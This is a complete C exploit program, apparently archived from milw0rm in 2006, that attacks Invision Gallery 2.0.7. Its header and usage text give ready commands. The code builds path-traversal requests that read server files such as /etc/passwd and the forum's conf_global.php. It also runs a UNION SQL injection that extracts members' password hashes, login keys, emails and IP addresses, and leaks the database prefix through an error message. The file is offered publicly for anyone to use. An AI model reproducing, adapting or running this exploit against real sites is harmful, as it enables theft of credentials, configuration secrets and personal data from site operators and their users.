/*
     _  _     _ _ _  __     _      _   _
    | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
    | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
    |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
      hellknights.void.ru    |___/  
                 (c)oded by _1nf3ct0r_

 Invision Gallery => 2.0.7 ReadFile() & SQL injection exploit
 
+-------------+
|   Uzage:    |
+-------------+
[+] ReadFile():
  - syntax:
  readfile 1 <host> <pathtoindex> <localfile> 
  readfile 2 <host> <pathtoindex> <localfile>  // try it if readfile[1] failed ;)
   - params: 
  <localfile> -  path to local file (../file), for example: ../../../../../etc/passwd
   s0, if u want to get local path to IPB try this: ../../hellknightscrewxploit :) 
   - examples:
   readfile 1 asd.ru index.php ../../../../../../etc/passwd
   readfile 1 asd.ru forum/index.php ../../conf_global.php
   readfile 1 asd.ru forum/index.php ../../conf_global.php%00
   
[+] SQL-injection:
  - syntax
  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>
  getprefix <host> <pathtoindex>   // get database prefix from IPB error :) 
  - params:
  <member_id> -  member's id for SQL-injection result, for example: 1
  <column>    -  ipb members' column to get. for example: ip_adress, email.
  <table>     -  ipb table to use. for example: member
  <prefix>    -  database prefix. 
  - examples:
  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  
  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1
  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5
  
[~] sorry, but i`m too lazy 2 optimize this c0de... 
[~] Music: Orbital - Halcyon and On and On (OST Hackers) :) 
[~] compiled with LCC without any warnings

Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team 
             itz public c0de n0w, have phun :> 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

DWORD resolve(char *host)
{
    DWORD ret = 0;
    struct hostent * hp = gethostbyname(host);
    if (!hp) ret = inet_addr(host);
    if ((!hp)&&(ret == INADDR_NONE)) return 0;
    if (hp != NULL) memcpy((void*)&ret, hp->h_addr,hp->h_length);
    return ret;
}

int Exploit(char * sendbuffer, char * mode, char * host)
{
	char recvbuffer[10024]; char * temp; 
	memset(recvbuffer,0,10024);

	SOCKET s = socket(AF_INET,SOCK_STREAM,0);
	SOCKADDR_IN webaddr;
		webaddr.sin_addr.S_un.S_addr = resolve(host);
		webaddr.sin_family = AF_INET;
		webaddr.sin_port = htons(80);
	if(connect(s, (struct sockaddr *)&webaddr,sizeof(SOCKADDR_IN))) return -1;
	send(s, sendbuffer, strlen(sendbuffer),0);
	
	int i, j;
	while(i = recv(s,recvbuffer+strlen(recvbuffer),1,0)) 
	for(int i = 0; recvbuffer[i]!=0; ++i)
	{
		if((recvbuffer[i]=='\r')&&(recvbuffer[i+1]=='\n')&&
			(recvbuffer[i+2]=='\r')&&(recvbuffer[i+3]=='\n'))
		{temp = (char*)&recvbuffer[i] + 4;break;}
	}
	
	
	if(strcmp(mode,"readfile")==0)
	{
	printf("\n [+] Exploit Result:\n\n%s", temp);
	return 0;
	}
	
	if(strcmp(mode,"sqlinject")==0)
	{		
	char * token = NULL; char * injected = NULL; char * parse = NULL;
    token = strtok(temp, "="); 
	token = strtok(NULL, "=");
	token = strtok(NULL, "&");
	token = strtok(NULL, "&");
	for(int j = 0; j < 2; j++)
		{
    	token = strtok(NULL, "&");
	    if(j==1){ injected = token; printf("\n [+] Exploit Result:\n\n%s", injected); }
		}

	} else { printf("\n[-] some error. change MODE param\n"); return 0; } 
	return 0;
}

int main(int argc,char * argv[])
{
WSADATA wsaData;
WSAStartup(MAKEWORD(2,2),&wsaData);

		printf("\n ...............................................................\n");
        printf("  Invision Gallery 2.0.7 ReadFile() & SQL injection exploit       \n");
        printf("         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \n");
		printf("               http://hellknights.void.ru/                        \n");
		printf("  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \n");
		printf(" ...............................................................  \n");
		
	if (argc == 1) {

printf("\n\n [+] ReadFile():\n");
printf("  - syntax:\n");
printf("  readfile 1 <host> <pathtoindex> <localfile> \n");
printf("  readfile 2 <host> <pathtoindex> <localfile>   -- try it 1f readfile[1] failed \n");
printf("  - params: \n");
printf("  <localfile> -  path to local file (../file), f0r example: ../../../../../etc/passwd\n");
printf("  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \n");
printf("  - examples:\n");
printf("  readfile 1 asd.ru index.php ../../../../../../etc/passwd\n");
printf("  readfile 1 asd.ru forum/index.php ../../conf_global.php\n");
printf("  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\n\n\n");
printf(" [+] SQL-injection:\n");
printf("  - syntax\n");
printf("  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\n");
printf("  getprefix <host> <pathtoindex>   -- get database prefix from IPB error  \n");
printf("  - params:\n");
printf("  <member_id> -  member's id for SQL-injection result, for example: 1\n");
printf("  <column>    -  ipb members' column to get. for example: ip_adress, email.\n");
printf("  <table>     -  ipb table to use. f0r example: member\n");
printf("  <prefix>    -  database prefix. \n");
printf("  - examples:\n");
printf("  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \n");
printf("  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\n");
printf("  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\n\n");
		           return 1;
	               }
	
char * mode = argv[1];


// --- readfile() exploit --- //
if (strcmp(mode,"readfile")==0)
{ 
char * type = argv[2];
char * path = NULL; path = argv[4];
char * localfile = argv[5];
char * host = argv[3]; 
	if (strcmp(type,"1")==0)
	{
	char exploit[1024]; 
	strcpy(exploit, "GET /"); 
	strcat(exploit, path); 
	strcat(exploit, "?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=");
	strcat(exploit, localfile);
    strcat(exploit, " HTTP/1.0\r\nHost: ");
	strcat(exploit, host); 
	strcat(exploit, "\r\n\r\n"); 
Exploit(exploit, "readfile", host);

	} 
	else if (strcmp(type,"2")==0)
	{
	char exploit[1024]; 
	strcpy(exploit, "GET /"); 
	strcat(exploit, path); 
	strcat(exploit, "?act=gallery&code=viewimage&img=index.gif&dir=");
	strcat(exploit, localfile);
    strcat(exploit, " HTTP/1.0\r\nHost: ");
	strcat(exploit, host); 
	strcat(exploit, "\r\n\r\n"); 
Exploit(exploit, "readfile", host);
	}

// --- sql-injection exploit --- //
} 
if(strcmp(mode,"sqlinject")==0)
{
char * host = argv[2]; 
char * path = argv[3];
char * prefix = argv[5];
char * column = argv[4];
char * table = argv[6];
char * id = argv[7];

	char exploit[1024]; 
	strcpy(exploit, "GET /"); 
	strcat(exploit, path); 
	strcat(exploit, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20union%20select%201,");
	strcat(exploit, column);
	strcat(exploit, ",1,1,1,1,1,1,1,1%20FROM%20");
	strcat(exploit, prefix);
	strcat(exploit, table);
	strcat(exploit, "%20WHERE%20id=");
	strcat(exploit, id);
	strcat(exploit, "/*31337*/");
    strcat(exploit, " HTTP/1.0\r\nHost: ");
	strcat(exploit, host); 
	strcat(exploit, "\r\n\r\n"); 
    Exploit(exploit, "sqlinject", host);
} 
if (strcmp(mode,"getprefix")==0)
{ 
char * path = argv[3];
char * host = argv[2]; 
	char exploit[1024]; 
	strcpy(exploit, "GET /"); 
	strcat(exploit, path); 
	strcat(exploit, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20hellknightscrew");
    strcat(exploit, " HTTP/1.0\r\nHost: ");
	strcat(exploit, host); 
	strcat(exploit, "\r\n\r\n"); 
printf("\n\n\n[!] u can get database prefix from this error. example: SELECT * FROM <PREFIX>gallery_albums\n\n");
Exploit(exploit, "readfile", host);
}

WSACleanup();
	return 0;
}

// milw0rm.com [2006-10-03]
